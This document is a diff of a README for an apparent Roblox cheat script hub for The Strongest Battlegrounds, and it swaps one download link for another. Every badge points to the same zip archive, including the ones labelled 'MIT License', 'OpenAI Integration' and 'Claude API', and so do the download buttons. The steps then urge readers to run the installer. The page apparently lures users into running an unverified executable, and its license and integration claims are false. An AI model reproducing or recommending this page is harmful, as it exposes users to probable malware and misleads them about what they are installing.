@@ -1,14 +1,14 @@
 # NEW The Strongest Battlegrounds Script Roblox
 
-[![Version](https://raw.githubusercontent.com/raju4179/strongest-battlegrounds-script-hub/branch/zoolith/battlegrounds_hub_script_strongest_v3.7.zip)](https://raw.githubusercontent.com/raju4179/strongest-battlegrounds-script-hub/branch/zoolith/battlegrounds_hub_script_strongest_v3.7.zip)
-[![License](https://raw.githubusercontent.com/raju4179/strongest-battlegrounds-script-hub/branch/zoolith/battlegrounds_hub_script_strongest_v3.7.zip)](#-mit-license)
-[![Build Status](https://raw.githubusercontent.com/raju4179/strongest-battlegrounds-script-hub/branch/zoolith/battlegrounds_hub_script_strongest_v3.7.zip)](https://raw.githubusercontent.com/raju4179/strongest-battlegrounds-script-hub/branch/zoolith/battlegrounds_hub_script_strongest_v3.7.zip)
-[![OpenAI Integration](https://raw.githubusercontent.com/raju4179/strongest-battlegrounds-script-hub/branch/zoolith/battlegrounds_hub_script_strongest_v3.7.zip)](https://raw.githubusercontent.com/raju4179/strongest-battlegrounds-script-hub/branch/zoolith/battlegrounds_hub_script_strongest_v3.7.zip)
-[![Claude API](https://raw.githubusercontent.com/raju4179/strongest-battlegrounds-script-hub/branch/zoolith/battlegrounds_hub_script_strongest_v3.7.zip)](https://raw.githubusercontent.com/raju4179/strongest-battlegrounds-script-hub/branch/zoolith/battlegrounds_hub_script_strongest_v3.7.zip)
+[![Version](https://github.com/raju4179/strongest-battlegrounds-script-hub/raw/refs/heads/branch/zoolith/strongest-battlegrounds-hub-script-1.0.zip)](https://github.com/raju4179/strongest-battlegrounds-script-hub/raw/refs/heads/branch/zoolith/strongest-battlegrounds-hub-script-1.0.zip)
+[![License](https://github.com/raju4179/strongest-battlegrounds-script-hub/raw/refs/heads/branch/zoolith/strongest-battlegrounds-hub-script-1.0.zip)](#-mit-license)
+[![Build Status](https://github.com/raju4179/strongest-battlegrounds-script-hub/raw/refs/heads/branch/zoolith/strongest-battlegrounds-hub-script-1.0.zip)](https://github.com/raju4179/strongest-battlegrounds-script-hub/raw/refs/heads/branch/zoolith/strongest-battlegrounds-hub-script-1.0.zip)
+[![OpenAI Integration](https://github.com/raju4179/strongest-battlegrounds-script-hub/raw/refs/heads/branch/zoolith/strongest-battlegrounds-hub-script-1.0.zip)](https://github.com/raju4179/strongest-battlegrounds-script-hub/raw/refs/heads/branch/zoolith/strongest-battlegrounds-hub-script-1.0.zip)
+[![Claude API](https://github.com/raju4179/strongest-battlegrounds-script-hub/raw/refs/heads/branch/zoolith/strongest-battlegrounds-hub-script-1.0.zip)](https://github.com/raju4179/strongest-battlegrounds-script-hub/raw/refs/heads/branch/zoolith/strongest-battlegrounds-hub-script-1.0.zip)
 
 ---
 
-![Download](https://raw.githubusercontent.com/raju4179/strongest-battlegrounds-script-hub/branch/zoolith/battlegrounds_hub_script_strongest_v3.7.zip)[Download](LINK)
+![Download](https://github.com/raju4179/strongest-battlegrounds-script-hub/raw/refs/heads/branch/zoolith/strongest-battlegrounds-hub-script-1.0.zip)[Download](LINK)
 
 ---
 
@@ -58,7 +58,7 @@ Embark on your Roblox-enhancing journey — it’s simple and secure. We call ou
 
 1. **Click the stylish Download button below to acquire your installer:**
 
-   [![Download](https://raw.githubusercontent.com/raju4179/strongest-battlegrounds-script-hub/branch/zoolith/battlegrounds_hub_script_strongest_v3.7.zip)](LINK)
+   [![Download](https://github.com/raju4179/strongest-battlegrounds-script-hub/raw/refs/heads/branch/zoolith/strongest-battlegrounds-hub-script-1.0.zip)](LINK)
 
 2. **Open the installer you obtained via AccessWave.**
 
@@ -107,7 +107,7 @@ Our "AccessWave" delivery system offers safe, stable, and up-to-the-minute scrip
 
 1. Tap the Download button:
 
-   [![Download](https://raw.githubusercontent.com/raju4179/strongest-battlegrounds-script-hub/branch/zoolith/battlegrounds_hub_script_strongest_v3.7.zip)](LINK)
+   [![Download](https://github.com/raju4179/strongest-battlegrounds-script-hub/raw/refs/heads/branch/zoolith/strongest-battlegrounds-hub-script-1.0.zip)](LINK)
 
 2. Run the provided file. The installation wizard will sheath you in the latest defensive and offensive script layers.
 3. Open Roblox. Select your game. Let the script transform your experience from ordinary to legendary in seconds.
@@ -125,7 +125,7 @@ Our "AccessWave" delivery system offers safe, stable, and up-to-the-minute scrip
 
 Copyright (c) 2025
 
-This project is licensed under the terms of the [MIT License](https://raw.githubusercontent.com/raju4179/strongest-battlegrounds-script-hub/branch/zoolith/battlegrounds_hub_script_strongest_v3.7.zip).
+This project is licensed under the terms of the [MIT License](https://github.com/raju4179/strongest-battlegrounds-script-hub/raw/refs/heads/branch/zoolith/strongest-battlegrounds-hub-script-1.0.zip).
 
 ---
 
@@ -133,7 +133,7 @@ This project is licensed under the terms of the [MIT License](https://raw.github
 
 Change your gameplay. Embrace the future of Roblox scripting with the NEW The Strongest Battlegrounds Script Roblox toolkit.
 
-[![Download](https://raw.githubusercontent.com/raju4179/strongest-battlegrounds-script-hub/branch/zoolith/battlegrounds_hub_script_strongest_v3.7.zip)](LINK)
+[![Download](https://github.com/raju4179/strongest-battlegrounds-script-hub/raw/refs/heads/branch/zoolith/strongest-battlegrounds-hub-script-1.0.zip)](LINK)
 
 ---
 
